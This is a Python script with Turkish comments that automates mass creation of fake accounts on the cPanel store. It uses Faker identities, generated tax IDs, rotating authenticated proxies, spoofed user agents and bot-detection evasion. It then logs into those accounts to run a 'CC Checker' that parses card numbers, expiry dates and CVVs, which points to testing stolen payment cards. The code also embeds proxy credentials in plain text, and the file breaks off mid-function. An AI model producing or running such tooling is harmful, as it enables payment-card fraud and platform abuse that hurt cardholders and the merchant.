"""
cPanel Store Account Creator & Checker System
Adım 1: Account Creator + Database Setup (UPDATED WITH XPATHS)
"""

import sqlite3
import random
import time
from datetime import datetime
from faker import Faker
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait, Select
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
import undetected_chromedriver as uc
import string
import json

# ============= KONFİGÜRASYON =============
# Private Proxies with Authentication
PROXY_USERNAME = "voxexsus"
PROXY_PASSWORD = "gb487o6gj6ye"

PROXIES = [
    "142.111.48.253:7030",
    "31.59.20.176:6754",
    "23.95.150.145:6114",
    "198.23.239.134:6540",
    "45.38.107.97:6014",
    "107.172.163.27:6543",
    "198.105.121.200:6462",
    "64.137.96.74:6641",
    "216.10.27.159:6837",
    "142.111.67.146:5611",
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13.5; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_7_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:117.0) Gecko/20100101 Firefox/117.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:118.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
]

US_STATES = [
    "Alabama", "Alaska", "Arizona", "Arkansas", "California", "Colorado",
    "Connecticut", "Delaware", "Florida", "Georgia", "Hawaii", "Idaho",
    "Illinois", "Indiana", "Iowa", "Kansas", "Kentucky", "Louisiana",
    "Maine", "Maryland", "Massachusetts", "Michigan", "Minnesota",
    "Mississippi", "Missouri", "Montana", "Nebraska", "Nevada",
    "New Hampshire", "New Jersey", "New Mexico", "New York",
    "North Carolina", "North Dakota", "Ohio", "Oklahoma", "Oregon",
    "Pennsylvania", "Rhode Island", "South Carolina", "South Dakota",
    "Tennessee", "Texas", "Utah", "Vermont", "Virginia", "Washington",
    "West Virginia", "Wisconsin", "Wyoming"
]

DB_NAME = "cpanel_checker.db"
REGISTER_URL = "https://store.cpanel.net/register.php"
CARDS_PER_ACCOUNT = 500
HEADLESS_MODE = False

# ============= DATABASE SETUP =============
class Database:
    def __init__(self, db_name=DB_NAME):
        self.conn = sqlite3.connect(db_name, check_same_thread=False)
        self.cursor = self.conn.cursor()
        self.create_tables()
    
    def create_tables(self):
        # Hesaplar tablosu (Sadece önemli bilgiler)
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS accounts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                email TEXT UNIQUE NOT NULL,
                password TEXT NOT NULL,
                first_name TEXT,
                last_name TEXT,
                phone TEXT,
                user_agent TEXT,
                proxy TEXT,
                created_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_used TIMESTAMP,
                check_count INTEGER DEFAULT 0,
                success_count INTEGER DEFAULT 0,
                fraud_alerts INTEGER DEFAULT 0,
                status TEXT DEFAULT 'active',
                health_score INTEGER DEFAULT 100
            )
        ''')
        
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS checks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                account_id INTEGER,
                card_hash TEXT,
                result TEXT,
                response_time REAL,
                fraud_score INTEGER,
                checked_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                error_message TEXT,
                FOREIGN KEY (account_id) REFERENCES accounts(id)
            )
        ''')
        
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS statistics (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                account_id INTEGER,
                date DATE DEFAULT CURRENT_DATE,
                total_checks INTEGER DEFAULT 0,
                success_rate REAL DEFAULT 0.0,
                avg_response_time REAL DEFAULT 0.0,
                fraud_alerts INTEGER DEFAULT 0,
                FOREIGN KEY (account_id) REFERENCES accounts(id)
            )
        ''')
        
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                account_id INTEGER,
                action TEXT,
                message TEXT,
                log_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (account_id) REFERENCES accounts(id)
            )
        ''')
        
        self.conn.commit()
    
    def add_account(self, data):
        try:
            self.cursor.execute('''
                INSERT INTO accounts (email, password, first_name, last_name, 
                                     phone, user_agent, proxy)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (data['email'], data['password'], data['first_name'], 
                  data['last_name'], data['phone'], 
                  data['user_agent'], data['proxy']))
            self.conn.commit()
            return self.cursor.lastrowid
        except sqlite3.IntegrityError:
            print(f"❌ Email zaten var: {data['email']}")
            return None
        except Exception as e:
            print(f"❌ Database hatası: {str(e)}")
            return None
    
    def log_action(self, account_id, action, message):
        self.cursor.execute('''
            INSERT INTO logs (account_id, action, message)
            VALUES (?, ?, ?)
        ''', (account_id, action, message))
        self.conn.commit()
    
    def get_available_account(self):
        self.cursor.execute('''
            SELECT * FROM accounts 
            WHERE check_count < ? AND status = 'active' AND fraud_alerts < 3
            ORDER BY check_count ASC, last_used ASC
            LIMIT 1
        ''', (CARDS_PER_ACCOUNT,))
        return self.cursor.fetchone()
    
    def update_account_usage(self, account_id):
        self.cursor.execute('''
            UPDATE accounts 
            SET check_count = check_count + 1, last_used = CURRENT_TIMESTAMP
            WHERE id = ?
        ''', (account_id,))
        self.conn.commit()
    
    def get_account_stats(self, account_id):
        self.cursor.execute('''
            SELECT check_count, success_count, fraud_alerts, health_score 
            FROM accounts WHERE id = ?
        ''', (account_id,))
        return self.cursor.fetchone()

# ============= HESAP OLUŞTURUCU =============
class AccountCreator:
    def __init__(self, headless=HEADLESS_MODE):
        self.fake = Faker('en_US')
        self.db = Database()
        self.headless = headless
    
    def generate_password(self, length=16):
        """Güçlü şifre oluştur"""
        chars = string.ascii_letters + string.digits + "!@#$%^&*"
        return ''.join(random.choice(chars) for _ in range(length))
    
    def generate_phone(self):
        """ABD telefon numarası oluştur"""
        area_code = random.randint(200, 999)
        exchange = random.randint(200, 999)
        number = random.randint(1000, 9999)
        return f"+1-{area_code}-{exchange}-{number}"
    
    def generate_tax_id(self):
        """ABD EIN (Employer Identification Number) oluştur"""
        part1 = random.randint(10, 99)
        part2 = random.randint(1000000, 9999999)
        return f"{part1}-{part2}"
    
    def generate_account_data(self):
        """Rastgele hesap bilgileri oluştur"""
        username = self.fake.user_name() + str(random.randint(100, 999))
        email_provider = random.choice(['yopmail.com', 'gmail.com'])
        state = random.choice(US_STATES)
        
        return {
            'first_name': self.fake.first_name(),
            'last_name': self.fake.last_name(),
            'email': f"{username}@{email_provider}",
            'phone': self.generate_phone(),
            'address': self.fake.street_address(),
            'address2': self.fake.secondary_address() if random.choice([True, False]) else '',
            'city': self.fake.city(),
            'state': state,
            'zipcode': self.fake.zipcode(),
            'tax_id': self.generate_tax_id(),
            'password': self.generate_password(),
            'user_agent': random.choice(USER_AGENTS),
            'proxy': random.choice(PROXIES)
        }
    
    def setup_driver(self, proxy=None, user_agent=None):
        """Selenium driver'ı yapılandır (Private Proxy ile)"""
        options = uc.ChromeOptions()
        
        if self.headless:
            options.add_argument('--headless')
        
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_argument('--disable-gpu')
        
        if user_agent:
            options.add_argument(f'user-agent={user_agent}')
        
        # Private Proxy Authentication
        if proxy:
            proxy_extension = self.create_proxy_auth_extension(
                proxy_host=proxy.split(':')[0],
                proxy_port=proxy.split(':')[1],
                proxy_username=PROXY_USERNAME,
                proxy_password=PROXY_PASSWORD
            )
            options.add_extension(proxy_extension)
        
        driver = uc.Chrome(options=options)
        return driver
    
    def create_proxy_auth_extension(self, proxy_host, proxy_port, proxy_username, proxy_password):
        """Chrome extension oluştur (proxy authentication için)"""
        import os
        import zipfile
        
        manifest_json = """
        {
            "version": "1.0.0",
            "manifest_version": 2,
            "name": "Chrome Proxy",
            "permissions": [
                "proxy",
                "tabs",
                "unlimitedStorage",
                "storage",
                "<all_urls>",
                "webRequest",
                "webRequestBlocking"
            ],
            "background": {
                "scripts": ["background.js"]
            },
            "minimum_chrome_version":"22.0.0"
        }
        """

        background_js = """
        var config = {
                mode: "fixed_servers",
                rules: {
                  singleProxy: {
                    scheme: "http",
                    host: "%s",
                    port: parseInt(%s)
                  },
                  bypassList: ["localhost"]
                }
              };

        chrome.proxy.settings.set({value: config, scope: "regular"}, function() {});

        function callbackFn(details) {
            return {
                authCredentials: {
                    username: "%s",
                    password: "%s"
                }
            };
        }

        chrome.webRequest.onAuthRequired.addListener(
                    callbackFn,
                    {urls: ["<all_urls>"]},
                    ['blocking']
        );
        """ % (proxy_host, proxy_port, proxy_username, proxy_password)

        plugin_file = 'proxy_auth_plugin.zip'

        with zipfile.ZipFile(plugin_file, 'w') as zp:
            zp.writestr("manifest.json", manifest_json)
            zp.writestr("background.js", background_js)

        return plugin_file
    
    def fill_input_hybrid(self, driver, xpath, fallback_name, value, field_name):
        """Hybrid yaklaşım: Önce XPath, sonra name"""
        try:
            element = driver.find_element(By.XPATH, xpath)
            element.send_keys(value)
            print(f"  ✓ {field_name} (XPath)")
        except Exception as e:
            try:
                element = driver.find_element(By.NAME, fallback_name)
                element.send_keys(value)
                print(f"  ✓ {field_name} (Fallback)")
            except Exception as e2:
                print(f"  ✗ {field_name} BAŞARISIZ: {str(e2)}")
                raise
    
    def create_account(self):
        """Hesap oluştur"""
        account_data = self.generate_account_data()
        print(f"\n{'='*60}")
        print(f"🚀 Yeni Hesap Oluşturuluyor...")
        print(f"📧 Email: {account_data['email']}")
        print(f"🔐 Şifre: {account_data['password']}")
        print(f"📱 Telefon: {account_data['phone']}")
        print(f"🌐 Proxy: {account_data['proxy']}")
        print(f"{'='*60}\n")
        
        driver = None
        try:
            print("🔧 Browser başlatılıyor...")
            driver = self.setup_driver(
                proxy=account_data['proxy'],
                user_agent=account_data['user_agent']
            )
            
            print("⏳ Proxy authentication için bekleniyor (5 saniye)...")
            time.sleep(5)  # Proxy auth için ekstra bekleme
            
            print("🌐 Siteye gidiliyor...")
            driver.get(REGISTER_URL)
            
            print("⏳ Sayfa yükleniyor (relax mode)...")
            time.sleep(random.uniform(4, 6))  # Daha uzun ilk bekleme
            
            wait = WebDriverWait(driver, 20)
            
            print("✍️  Form dolduruluyor (yavaş ve relax)...")
            
            # First Name
            self.fill_input_hybrid(driver, '//*[@id="inputFirstName"]', 'firstname', 
                                  account_data['first_name'], "First Name")
            time.sleep(random.uniform(1, 1.5))  # Daha uzun beklemeler
            
            # Last Name
            self.fill_input_hybrid(driver, '//*[@id="inputLastName"]', 'lastname', 
                                  account_data['last_name'], "Last Name")
            time.sleep(random.uniform(1, 1.5))
            
            # Email
            self.fill_input_hybrid(driver, '//*[@id="inputEmail"]', 'email', 
                                  account_data['email'], "Email")
            time.sleep(random.uniform(1, 1.5))
            
            # Phone
            self.fill_input_hybrid(driver, '//*[@id="inputPhone"]', 'phonenumber', 
                                  account_data['phone'], "Phone")
            time.sleep(random.uniform(1, 1.5))
            
            # Address 1
            self.fill_input_hybrid(driver, '//*[@id="inputAddress1"]', 'address1', 
                                  account_data['address'], "Address 1")
            time.sleep(random.uniform(1, 1.5))
            
            # Address 2 (optional)
            if account_data['address2']:
                self.fill_input_hybrid(driver, '//*[@id="inputAddress2"]', 'address2', 
                                      account_data['address2'], "Address 2")
                time.sleep(random.uniform(1, 1.5))
            
            # City
            self.fill_input_hybrid(driver, '//*[@id="inputCity"]', 'city', 
                                  account_data['city'], "City")
            time.sleep(random.uniform(1, 1.5))
            
            # State (Dropdown)
            print("  📍 State seçiliyor...")
            try:
                state_select = Select(driver.find_element(By.ID, "stateselect"))
                state_select.select_by_visible_text(account_data['state'])
                print(f"  ✓ State: {account_data['state']}")
            except:
                state_select = Select(driver.find_element(By.NAME, "state"))
                state_select.select_by_visible_text(account_data['state'])
                print(f"  ✓ State (Fallback)")
            time.sleep(random.uniform(1, 1.5))
            
            # Postcode
            self.fill_input_hybrid(driver, '//*[@id="inputPostcode"]', 'postcode', 
                                  account_data['zipcode'], "Postcode")
            time.sleep(random.uniform(1, 1.5))
            
            # Country zaten US seçili
            print("  ✓ Country: US (default)")
            time.sleep(0.5)
            
            # Tax ID
            self.fill_input_hybrid(driver, '//*[@id="inputTaxId"]', 'tax_id', 
                                  account_data['tax_id'], "Tax ID")
            time.sleep(random.uniform(1, 1.5))
            
            # Password
            self.fill_input_hybrid(driver, '//*[@id="inputNewPassword1"]', 'password', 
                                  account_data['password'], "Password")
            time.sleep(random.uniform(1, 1.5))
            
            # Confirm Password
            self.fill_input_hybrid(driver, '//*[@id="inputNewPassword2"]', 'password2', 
                                  account_data['password'], "Confirm Password")
            time.sleep(random.uniform(1.5, 2))  # Şifre sonrası biraz daha uzun
            
            # Terms checkbox
            print("☑️  Terms checkbox işaretleniyor...")
            try:
                terms_checkbox = driver.find_element(By.NAME, "accepttos")
                driver.execute_script("arguments[0].click();", terms_checkbox)
                print("  ✓ Checkbox işaretlendi")
            except Exception as e:
                print(f"  ✗ Checkbox BAŞARISIZ: {str(e)}")
                raise
            time.sleep(random.uniform(1.5, 2.5))  # Checkbox sonrası relax
            
            # Register butonu
            print("🎯 Register butonuna tıklanıyor...")
            try:
                register_button = driver.find_element(By.XPATH, '//*[@id="frmCheckout"]/p[2]/input')
                driver.execute_script("arguments[0].scrollIntoView(true);", register_button)
                time.sleep(1.5)  # Scroll sonrası bekleme
                driver.execute_script("arguments[0].click();", register_button)
                print("  ✓ Register butonu tıklandı")
            except Exception as e:
                print(f"  ✗ Register butonu BAŞARISIZ: {str(e)}")
                raise
            
            # Başarı kontrolü
            print("⏳ Sonuç bekleniyor (relax mode - 2 saniye)...")
            time.sleep(2)  # Daha uzun sonuç bekleme
            
            current_url = driver.current_url
            page_source = driver.page_source.lower()
            
            # Başarı kontrolleri
            success_indicators = [
                "clientarea" in current_url,
                "success" in current_url,
                "welcome" in page_source,
                "dashboard" in current_url,
                "thank you" in page_source
            ]
            
            if any(success_indicators):
                print("✅ Hesap başarıyla oluşturuldu!")
                
                account_id = self.db.add_account(account_data)
                if account_id:
                    self.db.log_action(account_id, "account_created", "Hesap başarıyla oluşturuldu")
                    print(f"💾 Database'e kaydedildi (ID: {account_id})")
                    
                    with open('credentials.txt', 'a', encoding='utf-8') as f:
                        f.write(f"{account_data['email']}:{account_data['password']}\n")
                    print("📝 credentials.txt dosyasına kaydedildi")
                    
                    return True, account_data
            else:
                print("⚠️  Kayıt durumu belirsiz")
                print(f"🔗 Current URL: {current_url}")
                
                # Hata mesajı kontrolü
                error_indicators = ["error", "invalid", "failed", "wrong"]
                if any(ind in page_source for ind in error_indicators):
                    print("❌ Sayfada hata mesajı tespit edildi")
                
                return False, None
                
        except Exception as e:
            print(f"❌ HATA: {str(e)}")
            
            # SADECE HATA DURUMUNDA SCREENSHOT
            if driver:
                try:
                    screenshot_name = f"error_{int(time.time())}_{account_data['email'].split('@')[0]}.png"
                    driver.save_screenshot(screenshot_name)
                    print(f"📸 Screenshot kaydedildi: {screenshot_name}")
                except:
                    print("📸 Screenshot alınamadı")
            
            return False, None
        
        finally:
            if driver:
                time.sleep(3)  # Kapatmadan önce biraz bekle
                driver.quit()
    
    def create_multiple_accounts(self, count=5):
        """Birden fazla hesap oluştur"""
        print(f"\n🔥 {count} adet hesap oluşturulacak...\n")
        
        success_count = 0
        failed_accounts = []
        
        for i in range(count):
            print(f"\n📍 Hesap {i+1}/{count}")
            success, data = self.create_account()
            
            if success:
                success_count += 1
            else:
                if data:
                    failed_accounts.append(data['email'])
            
            # Hesaplar arası bekleme (DAHA KISA)
            if i < count - 1:
                wait_time = random.uniform(1, 3)  # 1-3 saniye yeterli
                print(f"⏳ Sonraki hesap için {wait_time:.1f} saniye bekleniyor...")
                time.sleep(wait_time)
        
        # Özet rapor
        print(f"\n{'='*60}")
        print(f"📊 ÖZET RAPOR")
        print(f"{'='*60}")
        print(f"✅ Başarılı: {success_count}/{count}")
        print(f"❌ Başarısız: {count - success_count}/{count}")
        
        if success_count > 0:
            success_rate = (success_count / count) * 100
            print(f"📈 Başarı Oranı: %{success_rate:.1f}")
        
        if failed_accounts:
            print(f"\n❌ Başarısız hesaplar:")
            for email in failed_accounts:
                print(f"   - {email}")
        
        print(f"{'='*60}\n")
        
        return success_count, count - success_count

# ============= CC CHECKER =============
class CCChecker:
    def __init__(self, headless=HEADLESS_MODE):
        self.db = Database()
        self.headless = headless
        self.login_url = "https://store.cpanel.net/clientarea.php"
    
    def setup_driver(self, proxy=None, user_agent=None):
        """Selenium driver'ı yapılandır (Private Proxy ile)"""
        options = uc.ChromeOptions()
        
        if self.headless:
            options.add_argument('--headless')
        
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_argument('--disable-gpu')
        
        if user_agent:
            options.add_argument(f'user-agent={user_agent}')
        
        # Private Proxy Authentication
        if proxy:
            proxy_extension = self.create_proxy_auth_extension(
                proxy_host=proxy.split(':')[0],
                proxy_port=proxy.split(':')[1],
                proxy_username=PROXY_USERNAME,
                proxy_password=PROXY_PASSWORD
            )
            options.add_extension(proxy_extension)
        
        driver = uc.Chrome(options=options)
        return driver
    
    def create_proxy_auth_extension(self, proxy_host, proxy_port, proxy_username, proxy_password):
        """Chrome extension oluştur (proxy authentication için)"""
        import zipfile
        
        manifest_json = """
        {
            "version": "1.0.0",
            "manifest_version": 2,
            "name": "Chrome Proxy",
            "permissions": [
                "proxy",
                "tabs",
                "unlimitedStorage",
                "storage",
                "<all_urls>",
                "webRequest",
                "webRequestBlocking"
            ],
            "background": {
                "scripts": ["background.js"]
            },
            "minimum_chrome_version":"22.0.0"
        }
        """

        background_js = """
        var config = {
                mode: "fixed_servers",
                rules: {
                  singleProxy: {
                    scheme: "http",
                    host: "%s",
                    port: parseInt(%s)
                  },
                  bypassList: ["localhost"]
                }
              };

        chrome.proxy.settings.set({value: config, scope: "regular"}, function() {});

        function callbackFn(details) {
            return {
                authCredentials: {
                    username: "%s",
                    password: "%s"
                }
            };
        }

        chrome.webRequest.onAuthRequired.addListener(
                    callbackFn,
                    {urls: ["<all_urls>"]},
                    ['blocking']
        );
        """ % (proxy_host, proxy_port, proxy_username, proxy_password)

        plugin_file = 'proxy_auth_plugin_checker.zip'

        with zipfile.ZipFile(plugin_file, 'w') as zp:
            zp.writestr("manifest.json", manifest_json)
            zp.writestr("background.js", background_js)

        return plugin_file
    
    def get_random_account(self):
        """Database'den rastgele bir hesap seç"""
        cursor = self.db.cursor
        cursor.execute('''
            SELECT id, email, password, user_agent, proxy, check_count 
            FROM accounts 
            WHERE status = 'active' AND fraud_alerts < 3 AND check_count < ?
            ORDER BY RANDOM() 
            LIMIT 1
        ''', (CARDS_PER_ACCOUNT,))
        
        result = cursor.fetchone()
        if result:
            return {
                'id': result[0],
                'email': result[1],
                'password': result[2],
                'user_agent': result[3],
                'proxy': result[4],
                'check_count': result[5]
            }
        return None
    
    def login_to_account(self, account):
        """Hesaba login ol"""
        print(f"\n{'='*60}")
        print(f"🔐 Login İşlemi Başlıyor...")
        print(f"📧 Email: {account['email']}")
        print(f"🌐 Proxy: {account['proxy']}")
        print(f"📊 Mevcut Check Sayısı: {account['check_count']}/{CARDS_PER_ACCOUNT}")
        print(f"{'='*60}\n")
        
        driver = None
        try:
            print("🔧 Browser başlatılıyor...")
            driver = self.setup_driver(
                proxy=account['proxy'],
                user_agent=account['user_agent']
            )
            
            print("⏳ Proxy authentication için bekleniyor...")
            time.sleep(4)
            
            print("🌐 Login sayfasına gidiliyor...")
            driver.get(self.login_url)
            time.sleep(random.uniform(3, 5))
            
            wait = WebDriverWait(driver, 20)
            
            # Email input
            print("✍️  Email giriliyor...")
            try:
                email_input = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="lform"]/div[2]/div[1]/input')))
                email_input.clear()
                email_input.send_keys(account['email'])
                print("  ✓ Email girildi")
            except:
                email_input = driver.find_element(By.NAME, "username")
                email_input.send_keys(account['email'])
                print("  ✓ Email girildi (Fallback)")
            time.sleep(random.uniform(1, 1.5))
            
            # Password input
            print("✍️  Şifre giriliyor...")
            try:
                password_input = driver.find_element(By.XPATH, '//*[@id="lform"]/div[2]/div[2]/input')
                password_input.clear()
                password_input.send_keys(account['password'])
                print("  ✓ Şifre girildi")
            except:
                password_input = driver.find_element(By.NAME, "password")
                password_input.send_keys(account['password'])
                print("  ✓ Şifre girildi (Fallback)")
            time.sleep(random.uniform(1, 1.5))
            
            # Login butonu (Enter tuşu)
            print("🎯 Login butonuna basılıyor (Enter)...")
            try:
                login_button = driver.find_element(By.XPATH, '//*[@id="btn-login"]')
                from selenium.webdriver.common.keys import Keys
                login_button.send_keys(Keys.RETURN)
                print("  ✓ Enter basıldı")
            except:
                password_input.send_keys(Keys.RETURN)
                print("  ✓ Enter basıldı (Fallback)")
            
            # Sonuç bekleme
            print("⏳ Login sonucu bekleniyor...")
            time.sleep(6)
            
            # Terms popup kontrolü
            try:
                print("🔍 Terms popup kontrol ediliyor...")
                terms_checkbox = driver.find_element(By.XPATH, '//*[@id="1x1x1"]')
                
                if terms_checkbox.is_displayed():
                    print("☑️  Terms checkbox işaretleniyor...")
                    driver.execute_script("arguments[0].click();", terms_checkbox)
                    time.sleep(1)
                    
                    print("🎯 Continue butonuna tıklanıyor...")
                    continue_button = driver.find_element(By.XPATH, '//*[@id="notifcontent"]/form/div/div/div[2]/button')
                    driver.execute_script("arguments[0].click();", continue_button)
                    print("  ✓ Continue tıklandı")
                    
                    time.sleep(4)
            except:
                print("  ℹ️  Terms popup yok (skip)")
            
            # Login başarı kontrolü
            current_url = driver.current_url
            print(f"🔗 Current URL: {current_url}")
            
            if "clientarea.php" in current_url and "login" not in current_url.lower():
                print("✅ Login başarılı!")
                return driver, True
            else:
                print("❌ Login başarısız!")
                if driver:
                    screenshot_name = f"login_fail_{int(time.time())}_{account['email'].split('@')[0]}.png"
                    driver.save_screenshot(screenshot_name)
                    print(f"📸 Screenshot: {screenshot_name}")
                return driver, False
                
        except Exception as e:
            print(f"❌ Login hatası: {str(e)}")
            if driver:
                try:
                    screenshot_name = f"login_error_{int(time.time())}.png"
                    driver.save_screenshot(screenshot_name)
                    print(f"📸 Screenshot: {screenshot_name}")
                except:
                    pass
            return driver, False
    
    def check_single_card(self, card_data):
        """Tek kart check et"""
        # Card formatı: 4532123456789012|12|2025|123 veya 4532123456789012|12/25|123
        parts = card_data.strip().split('|')
        
        if len(parts) < 3:
            print(f"❌ Geçersiz kart formatı! Örnek: 4532123456789012|12|2025|123")
            return
        
        card_number = parts[0].replace(' ', '')
        
        # Expiry date parse
        if len(parts) == 4:
            month = parts[1]
            year = parts[2]
            cvv = parts[3]
        else:
            # Format: MM/YY veya MM/YYYY
            if '/' in parts[1]:
                month, year = parts[1].split('/')
            else:
                month = parts[1]
                year = parts[2] if len(parts) > 2 else ''
            cvv = parts[2] if len(parts) == 3 else parts[3] if len(parts) == 4 else ''
        
        # Year formatını düzelt (YY -> YYYY)
        if len(year) == 2:
            year = f"20{year}"
        
